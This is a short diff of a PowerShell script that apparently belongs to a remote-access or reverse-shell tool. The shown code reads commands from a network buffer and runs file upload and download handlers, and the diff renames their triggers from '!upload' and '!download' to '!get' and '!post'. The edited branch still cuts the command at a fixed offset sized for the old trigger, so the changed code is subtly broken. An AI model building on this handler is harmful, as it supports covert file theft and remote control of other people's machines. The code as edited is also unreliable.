@@ -53,11 +53,11 @@ Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                 $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()
 
                 try {
-                    if ($cmd.StartsWith("!upload")) {
+                    if ($cmd.StartsWith("!get")) {
                         $path = $cmd.Substring(7).Trim()
                         $response = Upload-File $path
                     }
-                    elseif ($cmd.StartsWith("!download")) {
+                    elseif ($cmd.StartsWith("!post")) {
                         $parts = $cmd.Split("::")
                         if ($parts.Length -eq 3) {
                             $response = Download-File $parts[1].Trim() $parts[2].Trim()
